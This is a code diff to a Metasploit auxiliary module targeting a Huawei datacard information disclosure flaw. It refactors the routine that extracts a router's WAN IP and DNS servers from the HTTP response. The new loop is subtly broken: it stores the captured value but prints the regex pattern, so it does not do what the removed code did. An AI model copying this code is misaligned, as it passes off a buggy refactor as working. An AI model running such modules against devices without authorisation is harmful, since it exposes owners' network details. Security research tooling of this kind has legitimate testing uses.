@@ -26,6 +26,12 @@ class Metasploit3 < Msf::Auxiliary
     'Classification'   => /<Classify>(.*)<\/Classify>/i
   }
 
+  WAN_INFO = {
+    'Wan IP Address' => /<WanIPAddress>(.*)<\/WanIPAddress>/i,
+    'Primary Dns'    => /<PrimaryDns>(.*)<\/PrimaryDns>/i,
+    'Secondary Dns'  => /<SecondaryDns>(.*)<\/SecondaryDns>/i
+  }
+
   def initialize(info={})
     super(update_info(info,
       'Name'           => "Huawei Datacard Information Disclosure Vulnerability",
@@ -248,7 +254,6 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def get_router_wan_info
-
     res = send_request_raw(
       {
         'method'  => 'GET',
@@ -259,26 +264,16 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
+    resp_body = res.body.to_s
+
     print_status('WAN Details')
 
-    # Grabbing the WanIPAddress
-    if res.body.match(/<WanIPAddress>(.*)<\/WanIPAddress>/i)
-      wanipaddress = $1
-      print_status("Wan IP Address: #{wanipaddress}")
+    WAN_INFO.each do |k,v|
+      if resp_body.match(v)
+        info = $1
+        print_status("#{k}: #{v}")
+      end
     end
-
-    # Grabbing the PrimaryDns
-    if res.body.match(/<PrimaryDns>(.*)<\/PrimaryDns>/i)
-      primarydns = $1
-      print_status("Primary Dns: #{primarydns}")
-    end
-
-    # Grabbing the SecondaryDns
-    if res.body.match(/<SecondaryDns>(.*)<\/SecondaryDns>/i)
-      secondarydns = $1
-      print_status("Secondary Dns: #{secondarydns}")
-    end
-
   end
 
   def get_router_dhcp_info
